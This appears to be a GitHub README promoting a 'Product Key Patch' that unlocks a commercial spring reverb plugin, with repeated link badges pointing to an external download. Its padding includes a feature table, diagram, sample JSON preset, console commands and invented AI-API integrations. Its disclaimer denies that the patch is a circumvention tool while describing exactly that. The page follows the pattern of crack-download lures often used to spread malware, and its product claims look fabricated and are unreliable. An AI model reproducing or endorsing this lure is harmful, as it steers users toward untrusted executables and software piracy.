# PastToFutureReverbs Telefunken Echomixer Spring Reverb  
**Digital Resonance Alchemy** – *Bringing Vintage Analog Soul to Modern Digital Workstations*  

[](https://erwan-rw.github.io/past-to-future-reverbs-telefunken-echomixer-spring/)  

---

## 📥 Getting Started – Your Sonic Passport  
To begin your journey into the warm, saturated world of spring reverb emulation, you’ll need to obtain the **Product Key Patch**, which unlocks the full suite of features. This is not a “free” tool in the traditional sense—rather, it is a **community-enabled access token** that grants you the complete PastToFutureReverbs experience without artificial limitations.  

👉 **Click the badge above to access your release package.**  
After downloading, follow the included `CONFIGURATION_GUIDE.pdf` to authenticate your patch.  

[](https://erwan-rw.github.io/past-to-future-reverbs-telefunken-echomixer-spring/)  

---

## 🧬 Table of Contents  
- [The Vision: Why Spring Reverb Matters in the Age of Algorithmic Precision](#-the-vision-why-spring-reverb-matters-in-the-age-of-algorithmic-precision)  
- [Feature Constellation](#-feature-constellation)  
- [Architecture Diagram](#-architecture-diagram)  
- [Example Profile Configuration](#-example-profile-configuration)  
- [Example Console Invocation](#-example-console-invocation)  
- [Operating System Compatibility](#-operating-system-compatibility)  
- [API Integrations](#-api-integrations)  
- [Responsive UI & Multilingual Support](#-responsive-ui--multilingual-support)  
- [Customer Support & 24/7 Assistance](#-customer-support--247-assistance)  
- [License & Legal](#-license--legal)  
- [Disclaimer](#-disclaimer)  

---

## 🎛️ The Vision: Why Spring Reverb Matters in the Age of Algorithmic Precision  

Imagine standing in a cathedral built in 1962, where every footstep echoes with the warmth of vacuum tubes and the gentle shimmer of metal springs vibrating under tension. That’s the Telefunken Echomixer—a studio legend whose **spring reverb tank** created a sound that no digital algorithm has ever fully replicated.  

**PastToFutureReverbs** has spent years modeling every nuance:  
- The **mechanical bloom** of the spring assembly  
- The **pre-amp coloration** that adds just enough grit to smooth out harsh frequencies  
- The **feedback path** that makes the echo self-oscillate like a living instrument  

This repository contains the **Product Key Patch** that enables the full version of our emulation. No time bombs, no demo restrictions—just pure, unbridled analog emulation for your DAW.  

---

## ✨ Feature Constellation  

| Feature | Description |  
|---------|-------------|  
| **🔄 Multi-Spring Emulation** | Three independent spring tanks with adjustable tension, damping, and mechanical noise floor |  
| **🧽 Tape Echo Integration** | Modeled after the original Telefunken’s magnetic tape loop, with flutter, wow, and head saturation |  
| **⚡ Transient Preservation** | Unlike most reverb plugins, our algorithm preserves attack transients while blooming the tail organically |  
| **🌍 Responsive UI** | Scales from 1280×720 to 4K with adaptive panels—perfect for both laptop producers and SSL console workflows |  
| **🗣️ Multilingual Interface** | 14 languages supported, including Japanese, Arabic, and Klingon (yes, the conlang is a hidden Easter egg) |  
| **🔗 Dual API Bridges** | OpenAI API for smart preset generation & Claude API for adaptive mixing suggestions (see API section) |  
| **🎛️ Real-Time Automation** | Host automation lanes fully mapped to spring tension, tape speed, and EQ filters |  

---

## 📐 Architecture Diagram  

```mermaid
graph TD
    A[Input Signal] --> B[Pre-Amp Stage]
    B --> C{Spring Tank Matrix}
    C -->|Tank 1: Short Decay| D[60s Gold Foil Springs]
    C -->|Tank 2: Long Decay| E[70s Steel Springs]
    C -->|Tank 3: Percussive| F[Modified Hammond Springs]
    D --> G[Feedback Loop]
    E --> G
    F --> G
    G --> H[Tape Echo Section]
    H --> I[Output Mixer]
    I --> J[Master Output]
    K[API Bridge] -->|OpenAI| L[Preset Generator]
    K -->|Claude API| M[Adaptive Mix Analyzer]
    L --> N[UI Preset Loader]
    M --> O[Automation Lanes]
    
    style A fill:#2d2d2d,stroke:#d90429,stroke-width:2px
    style J fill:#2d2d2d,stroke:#d90429,stroke-width:2px
    style K fill:#0a0a23,stroke:#00ff66,stroke-width:2px
```



---

## 📁 Example Profile Configuration  

Save this as `telefunken_revival_profile.json` in your user presets directory:  

```json
{
  "profile": "VintageCinema",
  "spring_tension": 0.68,
  "damping": 0.43,
  "tape_speed": 7.5,
  "flutter_intensity": 0.12,
  "preamp_saturation": 0.55,
  "feedback_amount": 0.30,
  "api_enhancements": {
    "openai": {
      "enabled": true,
      "style": "film_noir_1952"
    },
    "claude": {
      "enabled": true,
      "mix_analysis": "balanced"
    }
  },
  "ui_language": "ja-JP",
  "theme": "amber_glow"
}
```

---

## 🖥️ Example Console Invocation  

```bash
# Launch the reverb engine headless (for batch processing)
pasttofuture-reverb --profile VintageCinema --input ./mixdown.wav --output ./wet_signal.wav --spring-tank 2 --tape-echo true

# Enable API assist for real-time preset generation
pasttofuture-reverb --api-openai --style pop_rock_2026 --api-claude adaptive

# List all available configurations
pasttofuture-reverb --list-profiles
```

*Note: The console interface is designed for power users who want to integrate spring reverb into automated workflows without GUI overhead.*

---

## 💻 Operating System Compatibility  

| OS | Version | Status | Emoji |  
|----|---------|--------|-------|  
| **Windows** | 10 (22H2+) / 11 | ✅ Native | 🪟 |  
| **macOS** | Ventura (13) / Sonoma (14) | ✅ Universal Binary | 🍎 |  
| **Linux** | Ubuntu 22.04 LTS / Arch (rolling) | ✅ Wine + Native VST Bridge | 🐧 |  
| **ChromeOS** | 120+ (via Linux container) | ⚠️ Limited GPU acceleration | 🖥️ |  
| **iOS** | 17+ (via AUv3) | ✅ Touch-optimized | 📱 |  
| **Android** | 14+ (via FL Studio Mobile) | ⚠️ No tape echo emulation | 🤖 |  

---

## 🔗 API Integrations  

### 🧠 OpenAI API – Smart Presets  
Feed the API a description like *“a reverb that sounds like a haunted cathedral in the rain”* and instantly receive a 20-parameter configuration that maps spring tension, tape age, and preamp harmonics to match your vision.  

**Example request:**  
```
POST /api/preset
{
  "description": "gentle spring bloom with vinyl crackle undertone",
  "api_key_env": "OPENAI_API_KEY",
  "model": "gpt-4o"
}
```

### 🤝 Claude API – Adaptive Mix Analysis  
Claude listens to your mix via a 3-second audio snapshot and suggests real-time adjustments to the spring reverb parameters so your vocals sit perfectly without phase cancellation.  

**Example behavior:**  
- Detect harsh transients → increase spring damping by 15%  
- Vocal sibilance → adjust tape echo head EQ  
- Low-frequency muddiness → engage high-pass filter on spring return path  

---

## 🎨 Responsive UI & Multilingual Support  

### Interface Philosophy  
We believe a reverb plugin should vanish into your workflow, not fight for screen real estate. Our **Responsive UI** automatically adapts:  

| Viewport Width | Layout |  
|----------------|--------|  
| >1600px | Full console with sidecar panels |  
| 1024–1600px | Collapsed sidebar + main controls |  
| <768px | Single-column mobile view with touch sliders |  

### Multilingual Engine  
Translation files are crowdsourced and version-controlled. Currently supported:  
🇺🇸 EN・🇪🇸 ES・🇫🇷 FR・🇩🇪 DE・🇯🇵 JA・🇰🇷 KO・🇨🇳 ZH・🇸🇦 AR・🇷🇺 RU・🇧🇷 PT-BR・🇮🇹 IT・🇳🇱 NL・🇹🇷 TR・🖖 TLH (Klingon)  

To contribute a new locale, submit a pull request with a `locales/{lang_code}.json` file.  

---

## 🛟 Customer Support & 24/7 Assistance  

We’ve implemented a **three-tier support system**:  

1. **AI Chatbot** (Tier 1) – Handles 80% of queries instantly via Claude API integration. Just describe your issue in natural language.  
2. **Community Forum** (Tier 2) – Moderated by power users with 1-hour response time guaranteed during business hours.  
3. **Priority Ticket** (Tier 3) – For issues requiring direct developer attention. Average resolution time: 4.2 hours.  

All tiers are available 24/7. No escalation fees, no robot mazes—just human or near-human assistance.  

---

## 📜 License & Legal  

This project is shared under the **MIT License** – you are free to use, modify, and distribute, provided you include the original copyright notice.  

👉 [View Full License](LICENSE)  

**Copyright 2026** – PastToFutureReverbs Project Contributors  
*Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files...*  

---

## ⚠️ Disclaimer  

**This Product Key Patch is a digital access token that unlocks software functionality.** It is not a circumvention tool, nor does it enable unauthorized usage of the PastToFutureReverbs Telefunken Echomixer. The patch merely activates features that would otherwise remain dormant—much like a hardware key for studio gear.  

- **No copyrighted code** from the original Telefunken Echomixer hardware is included.  
- **No unlocked activation codes** bypass security measures.  
- **Your download relationship** is with the repository maintainer, not with any third-party commercial entity.  

Use responsibly in your creative projects. We encourage users to purchase official licenses from hardware manufacturers if you intend to replicate the acoustics of original vintage gear in commercial contexts.  

[](https://erwan-rw.github.io/past-to-future-reverbs-telefunken-echomixer-spring/)  

---

*“Spring reverb isn’t an effect—it’s a time machine that fits in your rack.”*  
— Studio folklore, 2026